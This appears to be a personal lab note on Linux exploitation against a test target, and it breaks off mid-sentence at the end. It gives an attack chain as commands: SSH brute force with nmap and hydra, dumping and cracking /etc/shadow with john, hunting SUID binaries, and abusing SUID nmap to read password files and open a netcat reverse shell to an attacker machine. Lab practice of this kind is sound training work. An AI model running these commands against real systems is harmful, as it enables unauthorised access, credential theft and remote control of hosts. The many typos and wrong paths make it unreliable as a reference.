#Linux Exploitation
```bash
nmap 2.0.0.22 target 1(metasploit)
```
- target 1 - port 22 ssh open

Lets try brutforce login
```bash
nmap 2.0.0.22 -p 22 --script ssh-brute
```
- After sucessfull passowrd cracking login with the crdentials
```bash
ssh administrator@2.0.0.22
whoami
id if uid=1001 - secondory regular user so 1000 is regular user
cat /etc/password - you can find the other users
```

Horizontal escalation
-------------------------------
since we know the user name lets try the password attack
```bash
hydra -l marlinspike -P /usr/share/wordlists/john/lst 2.0.0.22 ssh -e nsr -t 4
```

- anothe way to know the password is
```bash
cat /etc/shadow - contails passowrd hashes
```
- copy the hashes in a file in kali and try john
```bash
nano hash.txt
john hash.txt
```
check weather the /etc/password and /etc/shadow are having write permissions

-To find the suid files
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
```
- if the linux machine is having **nmap** installe in suid file then we can use it to escalate the privileges
```bash
nmap --interactive
nmap> ! cat /etc/shadow
nmap> ! cat /etc/passwd
nmap> ! nc <kali IP> 1234 -e /bin/bash

```
- In kali machine run a netcat listener
```bash
nc -lvp 1234    
```
- GTFOBINS is helpful to find the suid files and how to use them to escalate the privileges
Gtfobins link: https://gtfobins.github.io/
- The main objective